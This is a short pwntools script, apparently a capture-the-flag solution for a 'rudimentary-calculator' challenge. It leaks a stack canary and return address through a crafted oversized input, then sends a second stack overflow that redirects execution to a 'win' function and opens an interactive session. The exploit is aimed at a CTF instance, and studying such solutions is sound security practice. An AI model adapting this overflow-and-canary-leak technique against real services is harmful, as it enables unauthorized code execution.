from pwn import *

io = remote('rudimentary-calculator.instances.ctf.l3ak.team', 1337, ssl=True)

io.sendlineafter(b'> ', b'1' + b'\x00' + b'0' * 4094 + p64(103))
io.recvuntil(b'Result: ')
res = int(io.recvline())

canary = (res >> 97 * 32) % 2**64
prev_rbp = (res >> 99 * 32) % 2**64
ret_addr = (res >> 101 * 32) % 2**64
bin_base = ret_addr - 0x1a9b
win_addr = bin_base + 0x128d

io.sendlineafter(b'> ', b'1' + b'\x00' + b'0' * 4094 + p64(103) + b'\x00' * 384 + p64(canary) + p64(0) + p64(win_addr))
io.sendlineafter(b'> ', b'quit')
io.interactive()
